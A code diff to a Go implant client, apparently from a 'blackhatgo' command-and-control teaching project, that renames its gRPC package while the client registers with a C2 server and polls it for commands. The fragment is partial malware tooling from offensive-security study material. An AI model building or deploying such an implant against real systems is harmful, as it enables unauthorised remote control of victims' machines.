@@ -1,7 +1,7 @@
 package main
 
 import (
-	"blackhatgo/c2c/grpcapi"
+	"blackhatgo/c2c/api"
 	"context"
 	"fmt"
 	"log"
@@ -23,7 +23,7 @@ func main() {
 		opts      []grpc.DialOption
 		conn      *grpc.ClientConn
 		err       error
-		client    grpcapi.ImplantClient
+		client    api.ImplantClient
 		implantId uuid.UUID
 	)
 
@@ -37,10 +37,10 @@ func main() {
 		log.Fatal(err)
 	}
 	defer conn.Close()
-	client = grpcapi.NewImplantClient(conn)
+	client = api.NewImplantClient(conn)
 
 	ctx := context.Background()
-	var req = new(grpcapi.Empty)
+	var req = new(api.Empty)
 	resp, err := client.RegisterNewImplant(ctx, req)
 	if err != nil {
 		log.Fatalln(err)
@@ -52,7 +52,7 @@ func main() {
 		md := metadata.Pairs("implant-id", implantId.String())
 		ctx = metadata.NewOutgoingContext(ctx, md)
 
-		var req = new(grpcapi.Empty)
+		var req = new(api.Empty)
 		cmd, err := client.FetchCommand(ctx, req)
 		if err != nil {
 			st, ok := status.FromError(err)
